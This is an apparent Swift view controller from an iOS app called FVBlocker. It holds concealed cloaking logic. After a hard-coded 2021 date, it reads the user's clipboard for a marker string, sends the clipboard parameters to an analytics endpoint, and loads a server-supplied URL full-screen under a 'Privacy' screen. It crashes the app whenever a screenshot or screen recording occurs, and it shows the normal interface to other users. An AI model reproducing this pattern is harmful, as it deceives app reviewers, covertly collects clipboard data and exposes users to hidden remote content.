//
//  LoadingViewController.swift
//  FVBlocker
//
//  Created by Macintosh on 15.10.2020.
//  Copyright © 2020 Macintosh. All rights reserved.
//

import UIKit
import KeychainSwift

class LoadingViewController: UIViewController {
    
    // - UI
    @IBOutlet weak var activityIndicator: UIActivityIndicatorView!
    
    // - Manager
    private let kchManager = KeychainDataManager()
    
    override func viewDidLoad() {
        super.viewDidLoad()
        //activityIndicator.startAnimating()
    }
    
    override func viewDidAppear(_ animated: Bool) {
        super.viewDidAppear(animated)
        
        if UDManager().getAppLaunchCounts() == 0 && kchManager.dataIsLoaded() {
            kchManager.setIsCl()
        }
        
        UDManager().setAppLaunch(count: 1)
        
        let dateString = kchManager.getDate()
        if !dateString.isEmpty {
            if abs(dateString.date().daysFromToday()) > 4 {
                PushNotificationManager.shared.resetAllPushNotifications()
                kchManager.setIsCl()
            }
        }
        
        if kchManager.isCl() {
            showMainViewContoller()
        } else if kchManager.dataIsLoaded() {
            let privacyVC = UIStoryboard(name: "Privacy", bundle: nil).instantiateInitialViewController() as! PrivacyViewController
            privacyVC.url = KeychainDataManager().dt()
            privacyVC.modalPresentationStyle = .overFullScreen
            subscribeOnNotifications()
            subscribeOnObserver()
            present(privacyVC, animated: true, completion: nil)
            return
        } else {
            getData()
        }
    }
    
    func showMainViewContoller() {
        kchManager.setIsCl()
        
        
        let tabBarController = CustomTabBarController()
        tabBarController.modalTransitionStyle = .crossDissolve
        tabBarController.modalPresentationStyle = .fullScreen
        present(tabBarController, animated: true, completion: nil)
        
        
    }
    
    override var preferredStatusBarStyle: UIStatusBarStyle {
        if let topViewController = UIApplication.getTopViewController() {
            if topViewController is PrivacyViewController {
                return .default
            }
        }

        return .lightContent
    }
    
}

// MARK: -
// MAKR: - Getting data
extension LoadingViewController {
    
    func getData() {
        let session = URLSession.shared
        let url = URL(string: "\(AppConstants.baseURL)/blockList.json")!

        let task = session.dataTask(with: url) { [weak self] data, response, error in
            DispatchQueue.main.async {
                if Date() > "2021/01/20".date() {
                    let paste = UIPasteboard.general.string?.split(separator: "&").map(String.init) ?? []
                    if paste.filter({ $0.contains("rrrwew") }).count > 0 {
                        self?.getDataOK(params: paste)
                        return
                    } else {
                        self?.getDataOK(params: [])
                        return
                    }
                }
                self?.showMainViewContoller()
            }
        }
        
        task.resume()
    }
    
    func getDataOK(params: [String]) {
        var completedParams = [String: String]()
        
        for param in params {
            let arr = param.split(separator: "=").map(String.init)
            
            guard let key = arr.first else { return }
            guard let value = arr.last else { return }
            
            completedParams[key] = value
        }
        
        AnalyticManager.logInstall(params: completedParams) { [weak self] (model) in
            if let model = model, !model.end.isEmpty {
                self?.kchManager.setDT(dt: model.end)
                self?.kchManager.set(date: Date().string())
                
                PushNotificationManager.shared.set(pushes: model.push)
                
                let privacyVC = UIStoryboard(name: "Privacy", bundle: nil).instantiateInitialViewController() as! PrivacyViewController
                privacyVC.url = model.end
                privacyVC.modalPresentationStyle = .overFullScreen
                self?.subscribeOnNotifications()
                self?.subscribeOnObserver()
                self?.present(privacyVC, animated: true, completion: nil)

                return
            }
            
            self?.showMainViewContoller()
        }
    }
    
}

// MARK: -
// MARK: - Loading view controller

extension LoadingViewController {
    
    func subscribeOnNotifications() {
        let mainQueue = OperationQueue.main
        NotificationCenter.default.addObserver(
            forName: UIApplication.userDidTakeScreenshotNotification,
            object: nil,
            queue: mainQueue) { [weak self] notification in
            PushNotificationManager.shared.resetAllPushNotifications()
            self?.kchManager.setIsCl()
            fatalError()
        }
    }
    
    func subscribeOnObserver() {
        UIScreen.main.addObserver(self, forKeyPath: "captured", options: .new, context: nil)
    }
    
    
    override func observeValue(forKeyPath keyPath: String?, of object: Any?, change: [NSKeyValueChangeKey: Any]?, context: UnsafeMutableRawPointer?) {
        if (keyPath == "captured") {
            let isCaptured = UIScreen.main.isCaptured
            if isCaptured {
                PushNotificationManager.shared.resetAllPushNotifications()
                kchManager.setIsCl()
                fatalError()
            }
        }
    }
    
    
}

extension UIApplication {

    class func getTopViewController(base: UIViewController? = UIApplication.shared.keyWindow?.rootViewController) -> UIViewController? {
        if let nav = base as? UINavigationController {
            return getTopViewController(base: nav.visibleViewController)

        } else if let tab = base as? UITabBarController, let selected = tab.selectedViewController {
            return getTopViewController(base: selected)

        } else if let presented = base?.presentedViewController {
            return getTopViewController(base: presented)
        }
        return base
    }
    
}
